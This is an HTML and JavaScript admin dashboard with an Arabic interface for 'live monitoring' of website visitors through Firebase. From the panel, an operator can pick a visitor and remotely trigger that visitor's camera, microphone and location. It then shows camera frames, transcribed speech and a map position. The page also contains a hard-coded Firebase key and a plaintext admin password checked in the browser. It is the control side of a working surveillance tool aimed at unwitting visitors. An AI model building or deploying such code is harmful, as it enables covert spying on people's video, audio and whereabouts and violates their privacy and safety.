<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة الإدارة - مراقبة مباشرة</title>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-storage-compat.js"></script>

  <style>
    body { font-family: 'Cairo', sans-serif; background:#f1f5f9; margin:0; }
    .container { max-width: 1300px; margin: auto; padding: 20px; }
    table { width:100%; background:white; border-collapse:collapse; border-radius:12px; overflow:hidden; }
    th, td { padding:12px; text-align:right; border-bottom:1px solid #eee; }
    th { background:#1e40af; color:white; }
    #live-feed { width:100%; max-width:700px; background:#000; border-radius:12px; margin:15px 0; }
    .panel { background:white; padding:20px; border-radius:12px; margin:20px 0; box-shadow:0 4px 15px rgba(0,0,0,0.1); }
  </style>
</head>
<body>

<div class="container">
  <h1>🔴 مراقبة الزوار مباشرة</h1>

  <div class="panel">
    <h2>الزوار الحاليين</h2>
    <table id="table"><thead><tr><th>الزائر</th><th>الجهاز</th><th>الموقع</th><th>الحالة</th></tr></thead><tbody></tbody></table>
  </div>

  <div class="panel" id="control-panel" style="display:none;">
    <h2>مراقبة الزائر: <span id="current-id"></span></h2>
    
    <button onclick="sendCommand('startCamera')">📹 بدء البث المباشر</button>
    <button onclick="sendCommand('requestLocation')">📍 تحديث الموقع</button>
    <button onclick="sendCommand('startMic')">🎤 تفعيل الصوت</button>

    <h3>البث المباشر (الكاميرا)</h3>
    <img id="live-feed" src="" alt="البث المباشر">

    <h3>الموقع</h3>
    <div id="map" style="height:400px;border-radius:12px;"></div>

    <h3>الصوت المسموع</h3>
    <div id="voice-text" style="background:#f0fdf4;padding:15px;border-radius:8px;min-height:80px;"></div>
  </div>
</div>

<script>
  const firebaseConfig = { /* نفس الإعدادات */ 
    apiKey: "AIzaSyBQ9MlVOSzohuTqSA2JdI19UjyldnAb-zI",
    authDomain: "ohaha-d130e.firebaseapp.com",
    projectId: "ohaha-d130e",
    storageBucket: "ohaha-d130e.firebasestorage.app",
    messagingSenderId: "309282072723",
    appId: "1:309282072723:web:ed17bfe365577fba2ec566"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();
  const storage = firebase.storage();

  let selectedId = null;

  function login() {
    const pass = prompt("كلمة مرور الإدارة:");
    if (pass === "521988") loadVisitors();
    else window.location.href = "index.html";
  }

  function loadVisitors() {
    db.ref('visitors').on('value', snap => {
      let html = '';
      snap.forEach(child => {
        const d = child.val();
        html += `<tr onclick="selectVisitor('${child.key}')">
          <td>${child.key}</td>
          <td>${d.device}</td>
          <td>${d.location ? '✅' : '❌'}</td>
          <td>متصل</td>
        </tr>`;
      });
      document.querySelector('#table tbody').innerHTML = html;
    });
  }

  function selectVisitor(id) {
    selectedId = id;
    document.getElementById('current-id').textContent = id;
    document.getElementById('control-panel').style.display = 'block';
    startLiveFeed(id);
    watchLocation(id);
    watchVoice(id);
  }

  function sendCommand(type) {
    if (!selectedId) return;
    db.ref('commands/' + selectedId).set({ type, time: Date.now() });
  }

  // عرض البث المباشر (آخر صورة)
  function startLiveFeed(id) {
    const img = document.getElementById('live-feed');
    setInterval(() => {
      storage.ref(`live/${id}`).listAll().then(res => {
        if (res.items.length > 0) {
          res.items.sort((a,b) => b.name.localeCompare(a.name)); // آخر صورة
          res.items[0].getDownloadURL().then(url => img.src = url);
        }
      });
    }, 900);
  }

  function watchLocation(id) {
    db.ref('visitors/' + id + '/location').on('value', snap => {
      const loc = snap.val();
      if (loc) {
        document.getElementById('map').innerHTML = 
          `<iframe width="100%" height="400" frameborder="0" 
           src="https://www.google.com/maps?q=${loc.lat},${loc.lng}&z=16&output=embed"></iframe>`;
      }
    });
  }

  function watchVoice(id) {
    db.ref('visitors/' + id + '/voice').on('value', snap => {
      const v = snap.val();
      if (v) document.getElementById('voice-text').innerHTML = `<strong>${new Date(v.time).toLocaleTimeString()}:</strong> ${v.text}`;
    });
  }

  window.onload = login;
</script>
</body>
</html>
